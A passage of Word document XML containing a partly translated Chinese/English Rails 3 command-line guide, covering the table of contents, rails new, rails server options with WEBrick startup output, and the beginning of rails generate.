            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails destroy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="03E4CB7F" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="008938C9" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="230"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId886" w:anchor="2" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rake</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7B5F66FA"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87" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>about</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15FE8C98"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88" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>assets</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="61645BCA"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89" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>db</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6222338A"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90" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>doc</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="55202932"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91" w:anchor="2-5" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>notes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DD94ADD"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92" w:anchor="2-6" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>routes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2419E91D"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93" w:anchor="2-7" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>test</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1110B56F"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94" w:anchor="2-8" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>tmp</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="490D2A22"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95" w:anchor="2-9" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Miscellaneous</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="191626C8" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="008938C9" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="230"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId896" w:anchor="3" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>The Rails Advanced Command Line</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="01DA84A0"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97" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails with Databases and SCM</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="371EA9EB" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="008938C9" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="230"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId898" w:anchor="different-servers" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>server</w:t>
        </w:r>
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> with Different Backends</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E697444"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本教程假设你已阅读 </w:t>
      </w:r>
      <w:hyperlink r:id="rId899" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 初上手指南</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，并掌握了 Rails 的基本知识。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9E21A8"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本指南基于 Rails 3.0 ，有些代码在 Rails 3.0 之前的版本上无法正常运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337DF26A" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>1 命令行基础</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C991D2"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下面是您经常会用到的命令：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEBD971" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="231"/>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rails console</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0187B6" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="231"/>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rails server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C042C9" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="231"/>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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CEE19F" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="231"/>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rails generate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B29158" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="231"/>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rails dbconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7E84C2" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="231"/>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rails new app_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B7CB43"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我们一起来用上面提到的命令创建一个简单的 Rails 应用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FD9971"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1.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F43E33"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创建 Rails 应用的第一件事就是执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails new</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F02DC34"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请先通过执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>gem install rails</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 安装 rails gem 。参考 </w:t>
      </w:r>
      <w:hyperlink r:id="rId900" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 3 Release Notes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="095D4BF3" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5BC6A12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new commandsapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E20C25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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79CD2CE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README.rdoc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F4129F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.gitignore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11F470B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Rakefile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69948028"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config.ru</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0105656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Gemfile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47102FA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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53020B70"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="107DBC3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tmp/cache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42A9DBA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tmp/pids</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B37636C"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Rails will set you up with what seems like a huge amount of stuff for such a tiny command! You’ve got the entire Rails directory structure now with all the code you need to run our simple application right out of the box.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EDFE46"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1.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2340ADAE"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w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command launches a small web server named WEBrick which comes bundled with Ruby. You’ll use this any time you want to access your application through a web browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0353B592"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WEBrick isn’t your only option for serving Rails. We’ll get to that </w:t>
      </w:r>
      <w:hyperlink r:id="rId901" w:anchor="different-servers" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>later</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D694ED9"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With no further work, </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will run our new shiny Rails app:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="453D9C91" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C02A62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cd commandsapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CAC6C3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server</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DC19D6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=&gt; Booting WEBrick</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67C1580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xml:space="preserve">=&gt; Rails 3.1.0 application starting in development on </w:t>
            </w:r>
            <w:hyperlink r:id="rId902" w:history="1">
              <w:r w:rsidRPr="0091039A">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>http://0.0.0.0:3000</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w14:paraId="7F5BFBC8"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=&gt; Call with -d to detach</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06D71AA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=&gt; Ctrl-C to shutdown server</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05270B6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[2010-04-18 03:20:33] INFO  WEBrick 1.3.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45EE57B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[2010-04-18 03:20:33] INFO  ruby 1.8.7 (2010-01-10) [x86_64-linux]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63A8291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[2010-04-18 03:20:33] INFO  WEBrick::HTTPServer#start: pid=26086 port=3000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67AC4383"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With just three commands we whipped up a Rails server listening on port 3000. Go to your browser and open </w:t>
      </w:r>
      <w:hyperlink r:id="rId903" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://localhost:3000</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, you will see a basic Rails app running.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A6D473"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You can also use the alias “s” to start the server: </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails s</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59313424"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server can be run on a different port using the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-p</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option. The default development environment can be changed using </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-e</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="4D8BBD39" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FAA264A" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1645818081"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0091039A">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails server -e production -p 4000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04E71378"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w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-b</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option binds Rails to the specified ip, by default it is 0.0.0.0. You can run a server as a daemon by passing a </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>-d</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE29B51"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1.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails generate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236D3929"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w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails generate</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
